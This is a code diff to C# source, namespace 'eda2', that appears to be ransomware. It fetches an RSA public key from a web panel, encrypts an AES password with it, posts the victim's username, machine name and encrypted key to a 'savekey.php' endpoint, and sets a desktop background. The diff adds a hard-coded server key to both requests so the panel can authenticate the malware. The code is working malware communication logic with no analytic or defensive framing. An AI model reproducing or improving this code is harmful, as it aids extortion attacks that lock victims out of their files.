@@ -39,6 +39,7 @@ namespace eda2
         const int keySize = 2048; //key size for RSA algorithm
         string publicKey;
         string encryptedPassword; //AES key encrypted with RSA public key
+		string servKey = "9E081816509A23B19B75FD59149FDD76";  //change your key for production in wwwroot/webpanel/config.php
         string userName = Environment.UserName;
         string computerName = System.Environment.MachineName.ToString();
         string userDir = "C:\\Users\\";
@@ -46,7 +47,6 @@ namespace eda2
         string keySaveUrl = "http://www.example.com/panel/savekey.php"; //saves encrypted key to database
         string backgroundImageUrl = "https://i.imgur.com/5iVZ4gf.jpg"; //desktop background picture
         string aesPassword;
-
 
 
         public Form1()
@@ -69,15 +69,17 @@ namespace eda2
             Opacity = 100;
         }
 
-        //Makes a POST request to web server with "username" and "pcname" parameters
+        //Makes a POST request to web server with "username" and "pcname" parameters.
         //Webserver responses with the RSA public key and the function returns it.
+		//ServKey param could be sniff, a signature update is possible in different ways.
         public string getPublicKey(string url)
         {
 
             WebClient webClient = new WebClient();
-            NameValueCollection formData = new NameValueCollection();
+            NameValueCollection formData = new NameValueCollection();					
             formData["username"] = userName;
             formData["pcname"] = computerName;
+			formData["servkey"] = servKey;	
             byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
             string responsefromserver = Encoding.UTF8.GetString(responseBytes);
             webClient.Dispose();
@@ -92,6 +94,7 @@ namespace eda2
             NameValueCollection formData = new NameValueCollection();
             formData["pcname"] = computerName;
             formData["aesencrypted"] = encryptedPassword;
+			formData["servkey"] = servKey;
             byte[] responseBytes = webClient.UploadValues(url, "POST", formData);
             webClient.Dispose();
         }
